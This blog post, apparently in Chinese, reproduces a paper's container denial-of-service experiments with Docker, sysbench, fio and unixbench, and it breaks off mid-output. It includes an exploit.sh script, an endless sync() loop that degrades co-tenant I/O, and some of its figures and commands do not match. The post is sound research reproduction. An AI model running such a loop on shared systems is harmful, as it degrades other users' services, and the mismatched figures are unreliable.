+<p>在这个容器当中可以使用 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Frb3B5dG92L3N5c2JlbmNo" title="https://github.com/akopytov/sysbench">sysbench<i class="fa fa-external-link"></i></span> 这个 cpu/memory 测试工具。这项工具的具体使用方法参照<span class="exturl" data-url="aHR0cHM6Ly93d3cuaG93dG9mb3JnZS5jb20vaG93LXRvLWJlbmNobWFyay15b3VyLXN5c3RlbS1jcHUtZmlsZS1pby1teXNxbC13aXRoLXN5c2JlbmNo" title="https://www.howtoforge.com/how-to-benchmark-your-system-cpu-file-io-mysql-with-sysbench">这里<i class="fa fa-external-link"></i></span>。</p>
+<p>在论文里面，对于性能的描述单位是</p>
+<ul>
+<li>events per second for cpu</li>
+<li>MiB per second for memory and I/O</li>
+</ul>
+<p>在这个 Dos Attack Case 里面，要运行 2 个 containers：一个是 malicious container，一个是 victim container。</p>
+<p>首先在 victim 当中运行 sysbench 性能测试，得到无任何干扰的 baseline，然后在相同和不同 cpu core 同时运行 victim/malicious container，查看对于 victim container 性能的影响。</p>
+<p>文章中说 victim container 和 malicious container 的 cpu share 和 quota 都一致，我在实验的时候设置的值如下</p>
+<ul>
+<li>cpu share 的值为默认的 1024</li>
+<li>cpu core 设定为 0 号</li>
+<li>quota 的值未设定，而是通过 <em>--cpus=&quot;.5&quot;</em> 来设置，即最多不超过 50%。</li>
+</ul>
+<p>首先是 base line 的 sysbench 测试</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run --cpuset-cpus=<span class="string">"0"</span> --cpus=<span class="string">".5"</span> --rm -it tianyu/ubuntu:v1</span></span><br><span class="line">root@84a29dfee4a6:/# sysbench --test=cpu --cpu-max-prime=20000 run</span><br><span class="line">sysbench 1.0.11 (using system LuaJIT 2.1.0-beta3)</span><br><span class="line">Running the test with following options:</span><br><span class="line">Number of threads: 1</span><br><span class="line">Initializing random number generator from current time</span><br><span class="line"></span><br><span class="line">Prime numbers limit: 20000</span><br><span class="line">Initializing worker threads...</span><br><span class="line">Threads started!</span><br><span class="line"></span><br><span class="line">CPU speed:</span><br><span class="line">    events per second:   218.67</span><br><span class="line"></span><br><span class="line">General statistics:</span><br><span class="line">    total time:                          10.0002s</span><br><span class="line">    total number of events:              2188</span><br><span class="line"></span><br><span class="line">Latency (ms):</span><br><span class="line">         min:                                  1.57</span><br><span class="line">         avg:                                  4.57</span><br><span class="line">         max:                                 57.72</span><br><span class="line">         95th percentile:                      9.22</span><br><span class="line">         sum:                               9998.17</span><br><span class="line"></span><br><span class="line">Threads fairness:</span><br><span class="line">    events (avg/stddev):           2188.0000/0.00</span><br><span class="line">    execution time (avg/stddev):   9.9982/0.00</span><br></pre></td></tr></table></figure>
+
+<p>sysbench 的测试结果显示，<em>events per second</em> 的值为 250.73。和论文当中的值 632.5 有较大差距，可能在于论文当中设置的 <em>--cpus</em> 参数值较大。我将 <em>--cpus</em> 改为 1 之后，得到的 <em>events per second</em> 的值为 627.17。</p>
+<p>接着做同一个 cpu core 运行 malicious container 的实验，得到的 <em>events per second</em> 的值为 7.31。</p>
+<p>最后是不同 cpu core 运行 malicious container 的实验，得到的 <em>events per second</em> 的值为 10.81。</p>
+<p>类似的，关于 memory 和 I/O Read/Write 的实验也和上述步骤类似，具体的 sysbench 测试语句如下，我参考了<span class="exturl" data-url="aHR0cHM6Ly9saW51eHRlY2hsYWIuY29tL2JlbmNobWFyay1saW51eC1zeXN0ZW1zLWluc3RhbGwtc3lzYmVuY2gtdG9vbC8=" title="https://linuxtechlab.com/benchmark-linux-systems-install-sysbench-tool/">这个网站<i class="fa fa-external-link"></i></span></p>
+<p><strong>memory</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> sysbench memory run</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>I/O</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> sysbench --<span class="built_in">test</span>=fileio --file-total-size=20G prepare</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sysbench --<span class="built_in">test</span>=fileio --file-total-size=20G --file-test-mode=rndrw --max-time=300 --max-requests=0 run</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sysbench --<span class="built_in">test</span>=fileio --file-total-size=20G cleanup</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>最后得到的数据如下所示</strong></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>CPU</th>
+<th>Memory</th>
+<th>I/O Read</th>
+<th>I/O Write</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Baseline</td>
+<td>250.73</td>
+<td>2545.81</td>
+<td>1.55</td>
+<td>1.03</td>
+</tr>
+<tr>
+<td>same core</td>
+<td>7.31</td>
+<td>56.22</td>
+<td>0.28</td>
+<td>0.18</td>
+</tr>
+<tr>
+<td>different core</td>
+<td>10.81</td>
+<td>68.74</td>
+<td>0.86</td>
+<td>0.58</td>
+</tr>
+</tbody></table>
+<h5 id="Graph"><a href="#Graph" class="headerlink" title="Graph"></a>Graph</h5><p>把<strong>减少率</strong>可视化如下图所示</p>
+<div id="container2" style="weight:80%; height: 600px"></div>
+<script type="text/javascript">
+var dom = document.getElementById("container2");
+var myChart = echarts.init(dom);
+var app = {};
+option = null;
+var seriesLabel = {
+normal: {
+show: true,
+position: 'right',
+textBorderWidth: 2
+}
+}
+option = {
+    title: {
+        text: 'Annual Rate'
+    },
+    tooltip: {
+        trigger: 'axis'
+    },
+    legend: {
+        data:['same core','different core']
+    },
+    grid: {
+        left: '3%',
+        right: '4%',
+        bottom: '3%',
+        containLabel: true
+    },
+    xAxis: {
+        type: 'category',
+        data: ['CPU','Memory','I/O Read','I/O Write']
+    },
+    yAxis: {
+        type: 'value'
+    },
+    series: [{
+            name:'same core',
+            type:'line',
+            data:[97.09, 97.8, 81.94, 82.53]
+        },
+        {
+            name:'different core',
+            type:'line',
+            data:[95.69, 97.3, 44.52, 43.69]
+        }
+    ]
+};
+;
+if (option && typeof option === "object") {
+    myChart.setOption(option, true);
+}
+</script>
+
+
+
+<h3 id="Case-2-Data-Synchronization"><a href="#Case-2-Data-Synchronization" class="headerlink" title="Case 2: Data Synchronization"></a>Case 2: Data Synchronization</h3><p>这一节关注的是 Linux 关于文件读写的漏洞。在进程对文件进行读写的时候，为了加快写操作的速度，系统采用了 <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvQ2FjaGVfKGNvbXB1dGluZyk=" title="https://en.wikipedia.org/wiki/Cache_(computing)">lazy disk writeback mechanism<i class="fa fa-external-link"></i></span> 来实现异步的往 disk 中写入 updated 的数据。对于 container 来说，它被允许调用一系列关于文件同步即 push Linux kernel 进行数据同步的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21vYnkvbW9ieS9ibG9iL2EzMDk5MGIzYzhkMGQ0MjI4MGZhNTAxMjg3ODU5ZTFkMjM5M2E5NTEvcHJvZmlsZXMvc2VjY29tcC9kZWZhdWx0Lmpzb24jTDMzMw==" title="https://github.com/moby/moby/blob/a30990b3c8d0d42280fa501287859e1d2393a951/profiles/seccomp/default.json#L333">系统调用<i class="fa fa-external-link"></i></span>，比如 sync，syncfs 还有 fsync 等。</p>
+<p>论文提出 sync 系统调用可以用来降低 system-wide I/O performance，进行 resource-freeing attack 以及建立 convert channel。当然，<strong>只有当前系统当中存在 write 行为的时候</strong>，sync 相关的 attack 才有用武之地。</p>
+<h4 id="I-O-Based-DOS-Attack"><a href="#I-O-Based-DOS-Attack" class="headerlink" title="I/O Based DOS Attack"></a>I/O Based DOS Attack</h4><p>这个实验中，依旧是 2 个 containers run 在不同的 cpu core，一个循环调用 sync() system call。另一个 victim container 中运行 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2F4Ym9lL2Zpbw==" title="https://github.com/axboe/fio">FIO benchmark<i class="fa fa-external-link"></i></span> 来检测 I/O performance，运行 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2tkbHVjYXMvYnl0ZS11bml4YmVuY2g=" title="https://github.com/kdlucas/byte-unixbench">Unix benchmark<i class="fa fa-external-link"></i></span> 来检测体统性能的变化。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run --cpuset-cpus=<span class="string">"0"</span> -v /home/zty/dev/byte-unixbench/:/unix-bench -v /home/zty/dev/fio:/fio --rm -it tianyu/ubuntu:v2</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>baseline</strong></p>
+<p><strong>fio benchmark</strong></p>
+<p>参考</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9maW8ucmVhZHRoZWRvY3MuaW8vZW4vbGF0ZXN0L2Zpb19kb2MuaHRt" title="https://fio.readthedocs.io/en/latest/fio_doc.htm">fio official doc<i class="fa fa-external-link"></i></span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAwMzg4MDU3MQ==" title="https://segmentfault.com/a/1190000003880571">使用fio测试磁盘I/O性能<i class="fa fa-external-link"></i></span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS9zaGFvbmlhbi8yMzE5MTc1" title="https://blog.51cto.com/shaonian/2319175">fio 命令入门到跑路<i class="fa fa-external-link"></i></span></p>
+<p>fio install </p>
+<p>在 Host 上就可以进行 configure 和 make 操作，在 container 中只需要在目录下运行 <em>make install</em> 即可</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /fio</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make install</span></span><br></pre></td></tr></table></figure>
+
+<p>fio test</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># fio -directory&#x3D;&#x2F;data&#x2F; -name&#x3D;tempfile.dat -direct&#x3D;1 -rw&#x3D;read -bs&#x3D;4k -size&#x3D;10M -numjobs&#x3D;16 -runtime&#x3D;100 -group_reporting</span><br><span class="line">bw (  KiB&#x2F;s): min&#x3D;16544, max&#x3D;46956, per&#x3D;100.00%, avg&#x3D;39513.48, stdev&#x3D;585.67, samples&#x3D;127</span><br><span class="line">iops        : min&#x3D; 4136, max&#x3D;11738, avg&#x3D;9877.77, stdev&#x3D;146.40, samples&#x3D;127</span><br><span class="line"></span><br><span class="line"># fio -directory&#x3D;&#x2F;data&#x2F; -name&#x3D;tempfile.dat -direct&#x3D;1 -rw&#x3D;write -bs&#x3D;4k -size&#x3D;10M -numjobs&#x3D;16 -runtime&#x3D;100 -group_reporting</span><br><span class="line">bw (  KiB&#x2F;s): min&#x3D; 3271, max&#x3D;22178, per&#x3D;100.00%, avg&#x3D;15604.92, stdev&#x3D;320.26, samples&#x3D;333</span><br><span class="line">iops        : min&#x3D;  817, max&#x3D; 5544, avg&#x3D;3900.79, stdev&#x3D;80.07, samples&#x3D;333</span><br><span class="line"></span><br><span class="line"># fio -directory&#x3D;&#x2F;data&#x2F; -name&#x3D;tempfile.dat -direct&#x3D;1 -rw&#x3D;randread -bs&#x3D;4k -size&#x3D;10M -numjobs&#x3D;16 -runtime&#x3D;100 -group_reporting</span><br><span class="line">bw (  KiB&#x2F;s): min&#x3D;  270, max&#x3D; 7788, per&#x3D;99.90%, avg&#x3D;1658.39, stdev&#x3D;60.54, samples&#x3D;3034</span><br><span class="line">iops        : min&#x3D;   66, max&#x3D; 1942, avg&#x3D;413.21, stdev&#x3D;15.11, samples&#x3D;3034</span><br><span class="line"></span><br><span class="line"># fio -directory&#x3D;&#x2F;data&#x2F; -name&#x3D;tempfile.dat -direct&#x3D;1 -rw&#x3D;randwrite -bs&#x3D;4k -size&#x3D;10M -numjobs&#x3D;16 -runtime&#x3D;100 -group_reporting</span><br><span class="line">bw (  KiB&#x2F;s): min&#x3D;  124, max&#x3D; 2304, per&#x3D;99.91%, avg&#x3D;1083.98, stdev&#x3D;25.23, samples&#x3D;3200</span><br><span class="line">iops        : min&#x3D;   28, max&#x3D;  576, avg&#x3D;270.17, stdev&#x3D; 6.31, samples&#x3D;3200</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>测试结果如上，主要关注bw和iops结果</p>
+</blockquote>
+<p>bw：磁盘的吞吐量，这个是顺序读写考察的重点 </p>
+<p>iops：磁盘的每秒读写次数，这个是随机读写考察的重点</p>
+<p><strong>unixbench</strong></p>
+<p>参考</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2tkbHVjYXMvYnl0ZS11bml4YmVuY2gvYmxvYi9tYXN0ZXIvVW5peEJlbmNoL1VTQUdF" title="https://github.com/kdlucas/byte-unixbench/blob/master/UnixBench/USAGE">官方 usage 文档<i class="fa fa-external-link"></i></span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ./Run execl fsdisk pipe spawn shell1</span></span><br><span class="line">System Benchmarks Index Values               BASELINE       RESULT    INDEX</span><br><span class="line">Execl Throughput                                 43.0       6388.6   1485.7</span><br><span class="line">File Copy 4096 bufsize 8000 maxblocks          5800.0    2444771.8   4215.1</span><br><span class="line">Process Creation                                126.0      14864.3   1179.7</span><br><span class="line">Shell Scripts (1 concurrent)                     42.4      13092.6   3087.9</span><br><span class="line"></span><br><span class="line">Shell Scripts (8 concurrent)                      ---        894.9      ---</span><br><span class="line">Shell Scripts (16 concurrent)                     6.0       1783.4   2972.3</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>DOS</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run --cpuset-cpus=<span class="string">"5"</span> -v /home/zty/dev/cfile:/cfile --rm -it ubuntu</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cat /cfile/exploit.sh </span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">	sync</span><br><span class="line">done</span><br><span class="line"><span class="meta">#</span><span class="bash"> /cfile/exploit.sh</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>fio</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">read</span><br><span class="line">bw (  KiB&#x2F;s): min&#x3D; 4719, max&#x3D;44356, per&#x3D;100.00%, avg&#x3D;23270.86, stdev&#x3D;781.80, samples&#x3D;211</span><br><span class="line">iops        : min&#x3D; 1179, max&#x3D;11088, avg&#x3D;5817.21, stdev&#x3D;195.46, samples&#x3D;211</span><br><span class="line"></span><br><span class="line">write</span><br><span class="line">bw (  KiB&#x2F;s): min&#x3D;  388, max&#x3D; 1462, per&#x3D;99.91%, avg&#x3D;836.21, stdev&#x3D;12.77, samples&#x3D;3200</span><br><span class="line">iops        : min&#x3D;   94, max&#x3D;  364, avg&#x3D;208.22, stdev&#x3D; 3.20, samples&#x3D;3200</span><br><span class="line"></span><br><span class="line">randread</span><br><span class="line">bw (  KiB&#x2F;s): min&#x3D;  462, max&#x3D; 1648, per&#x3D;99.92%, avg&#x3D;1110.15, stdev&#x3D;13.74, samples&#x3D;3200</span><br><span class="line">iops        : min&#x3D;  114, max&#x3D;  412, avg&#x3D;276.75, stdev&#x3D; 3.44, samples&#x3D;3200</span><br><span class="line"></span><br><span class="line">randwrite</span><br><span class="line">bw (  KiB&#x2F;s): min&#x3D;  261, max&#x3D; 1096, per&#x3D;99.93%, avg&#x3D;666.52, stdev&#x3D;10.12, samples&#x3D;3200</span><br><span class="line">iops        : min&#x3D;   63, max&#x3D;  274, avg&#x3D;165.91, stdev&#x3D; 2.54, samples&#x3D;3200</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>unixbench</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># .&#x2F;Run execl fsdisk pipe spawn shell1</span><br><span class="line">System Benchmarks Partial Index              BASELINE       RESULT    INDEX</span><br><span class="line">Execl Throughput                                 43.0       6146.8   1429.5</span><br><span class="line">File Copy 4096 bufsize 8000 maxblocks          5800.0    2251578.5   3882.0</span><br><span class="line">Process Creation                                126.0      14396.9   1142.6</span><br><span class="line">Shell Scripts (1 concurrent)                     42.4      12914.4   3045.8</span><br><span class="line"></span><br><span class="line">Shell Scripts (1 concurrent)                      ---        871.8      ---</span><br><span class="line">Shell Scripts (1 concurrent)                      6.0       1738.5   2897.5</span><br></pre></td></tr></table></figure>
+
+<h5 id="Graph-1"><a href="#Graph-1" class="headerlink" title="Graph"></a>Graph</h5><div id="container3" style="weight:100%; height: 600px"></div>
+<script type="text/javascript">
+var dom = document.getElementById("container3");
+var myChart = echarts.init(dom);
+var app = {};
+option = {
+    title: {
+        text: 'performance degradation',
+        subtext: '占 baseline 数据的比例'
+    },
+    tooltip: {
+        trigger: 'axis',
+        axisPointer: {
+            type: 'shadow'
+        }
+    },
+    grid: {
+        left: '3%',
+        right: '4%',
+        bottom: '3%',
+        containLabel: true
+    },
+    xAxis: {
+        type: 'value',
+        boundaryGap: [0, 0.01]
+    },
+    yAxis: {
+        type: 'category',
+        data: ['seq_read', 'seq_write', 'rand_read', 'rand_write', 'shell script', 'excel throughput', 'file copy', 'process creation']
+    },
+    series: [
+        {
+            color: '#2f4554',
+            label: {
+                show: 'true',
+                position: 'right',
+                fontSize: '14'
+            },
+            barWidth: '35',
+            type: 'bar',
+            data: [58.89, 5.36, 66.98, 61.41, 98.64, 96.22, 92.10, 96.86]
+        }
+    ]
+};
+;
+if (option && typeof option === "object") {
+    myChart.setOption(option, true);
+}
+</script>
+
+<h4 id="Resource-Freeing-Attack"><a href="#Resource-Freeing-Attack" class="headerlink" title="Resource-Freeing Attack"></a>Resource-Freeing Attack</h4><p>2 个 container run 在 同一个 cpu core，因此会 compete for cpu resource (cpu share is same as default 1024)</p>
+<p>victim container - file copy</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /apt/file-cp.sh </span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">curl https://www.cc98.org &gt; 0.txt</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">	cp 0.txt 1.txt</span><br><span class="line">done</span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run --cpuset-cpus=<span class="string">"0"</span> -v /home/zty/dev/tianyu-ubuntu/apt:/apt -it --rm tianyu/ubuntu:v2.1	<span class="comment"># v2.1 installs curl</span></span></span><br></pre></td></tr></table></figure>
+
+<p>malicious container - sync shell &amp; sysbench</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat exploit.sh </span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">	sync</span><br><span class="line">done</span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run --cpuset-cpus=<span class="string">"0"</span> -v /home/zty/dev/cfile:/cfile -it --rm tianyu/ubuntu:v1 <span class="comment"># v1 installs sysbench</span></span></span><br></pre></td></tr></table></figure>
+
+<p>baseline data</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">in</span> malicious container</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cpu benchmark</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sysbench --<span class="built_in">test</span>=cpu --cpu-max-prime=20000 run</span></span><br><span class="line">	events per second:   619.61</span><br><span class="line"><span class="meta">#</span><span class="bash"> memory benchmark</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sysbench --<span class="built_in">test</span>=cpu --cpu-max-prime=20000 run</span></span><br><span class="line">	6203.23 MiB/sec</span><br></pre></td></tr></table></figure>
+
+<p>normal case (run on the same core)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">in</span> malicious container</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cpu benchmark</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sysbench --<span class="built_in">test</span>=cpu --cpu-max-prime=20000 run</span></span><br><span class="line">	events per second:   308.21</span><br><span class="line"><span class="meta">$</span><span class="bash"> sysbench --<span class="built_in">test</span>=cpu --cpu-max-prime=20000 run</span></span><br><span class="line">	3105.56 MiB/sec</span><br></pre></td></tr></table></figure>
+
+<p>attack case</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">in</span> malicious container</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> exploit use sync</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> /cfile/exploit.sh &amp;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cpu benchmark</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sysbench --<span class="built_in">test</span>=cpu --cpu-max-prime=20000 run</span></span><br><span class="line">	events per second:   526.24</span><br><span class="line"><span class="meta">$</span><span class="bash"> sysbench --<span class="built_in">test</span>=cpu --cpu-max-prime=20000 run</span></span><br><span class="line">	5413.83 MiB/sec</span><br></pre></td></tr></table></figure>
+
+<h5 id="Graph-2"><a href="#Graph-2" class="headerlink" title="Graph"></a>Graph</h5><p>汇总之后如下图所示</p>
+<div id="container4" style="weight:100%; height: 600px"></div>
+<script type="text/javascript">
+var dom = document.getElementById("container4");
+var myChart = echarts.init(dom);
+var app = {};
+option = {
+    tooltip: {
+        trigger: 'axis',
+        axisPointer: {
+            type: 'cross',
+            crossStyle: {
+                color: '#999'
+            }
+        }
+    },
+    legend: {
+        data:['CPU','Memory']
+    },
+    xAxis: [
+        {
+            type: 'category',
+            data: ['baseline','normal','attack'],
+            axisPointer: {
+                type: 'shadow'
+            }
+        }
+    ],
+    yAxis: [
+        {
+            type: 'value',
+            name: 'events per second',
+            min: 0,
+            max: 700,
+            interval: 100
+        },
+        {
+            type: 'value',
+            name: 'MiB/s',
+            min: 0,
+            max: 7000,
+            interval: 1000
+        }
+    ],
+    series: [
+        {
+            name:'CPU',
+            label: {
+                normal: {
+                    show: 'true',
+                    position: 'top'
+                }
+            },
+            type:'bar',
+            barWidth: '40',
+            data:[619.61, 308.21, 526.24]
+        },
+        {
+            name:'Memory',
+            type:'bar',
+            yAxisIndex: 1,
+            label: {
+                normal: {
+                    show: 'true',
+                    position: 'top'
+                }
+            },
+            barWidth: '40',
+            data:[6203.23, 3105.26, 5413.83]
+        }
+    ]
+};
+;
+if (option && typeof option === "object") {
+    myChart.setOption(option, true);
+}
+</script>
+
+<h3 id="Case-3-System-Process-Journald"><a href="#Case-3-System-Process-Journald" class="headerlink" title="Case 3: System Process - Journald"></a>Case 3: System Process - Journald</h3><ul>
+<li><p>2 containers in <strong>different cores</strong> of the host</p>
+</li>
+<li><p>maclicious container: keep switching user and quit current user</p>
+</li>
+<li><p>victim container: run fio benchmark and unixbench same as case 2</p>
+</li>
+</ul>
+<h4 id="data-clloect"><a href="#data-clloect" class="headerlink" title="data clloect"></a>data clloect</h4><p>Dockerfile</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat Dockerfile</span></span><br><span class="line">FROM ubuntu</span><br><span class="line">MAINTAINER Tianyu &lt;lufeihaizei2008@gmail.com&gt;</span><br><span class="line">COPY ./apt /apt-info</span><br><span class="line">RUN cp /apt-info/sources.list /etc/apt/</span><br><span class="line">RUN apt-get update</span><br><span class="line">RUN yes | apt-get install make gcc perl</span><br><span class="line"><span class="meta">$</span><span class="bash"> docker build -t tianyu/ubuntu:v2 .</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>make sure you have installed <code>perl</code>, otherwise you will get trouble while running unixbench for it is using perl to do test.</strong></p>
+<p>base line</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run --cpuset-cpus=<span class="string">"0"</span> -v /home/zty/dev/byte-unixbench/:/unix-bench -v /home/zty/dev/fio:/fio --rm -it tianyu/ubuntu:v2</span></span><br><span class="line">root@2b6136c7c609:/# cd unix-bench/UnixBench</span><br><span class="line">root@2b6136c7c609:/unix-bench/UnixBench# ./Run execl fsdisk pipe spawn shell1</span><br><span class="line">System Benchmarks Partial Index              BASELINE       RESULT    INDEX</span><br><span class="line">Execl Throughput                                 43.0       6594.4   1533.6</span><br><span class="line">File Copy 4096 bufsize 8000 maxblocks          5800.0    2629512.0   4533.6</span><br><span class="line">Pipe Throughput                               12440.0    1035165.1    832.1</span><br><span class="line">Process Creation                                126.0      15519.4   1231.7</span><br><span class="line">Shell Scripts (1 concurrent)                     42.4      13463.1   3175.3</span><br><span class="line"></span><br><span class="line">root@2b6136c7c609:/# cd /fio/</span><br><span class="line">root@2b6136c7c609:/fio# make install</span><br><span class="line">root@2b6136c7c609:/fio# cd /</span><br><span class="line">root@2b6136c7c609:/# mkdir data</span><br><span class="line">root@2b6136c7c609:/# fio -directory=/data/ -name=tempfile.dat -direct=1 -rw=read -bs=4k -size=10M -numjobs=16 -runtime=30 -group_reporting</span><br><span class="line">   bw (  KiB/s): min=26101, max=50756, per=99.72%, avg=40570.14, stdev=499.94, samples=117</span><br><span class="line">   iops        : min= 6525, max=12688, avg=10142.25, 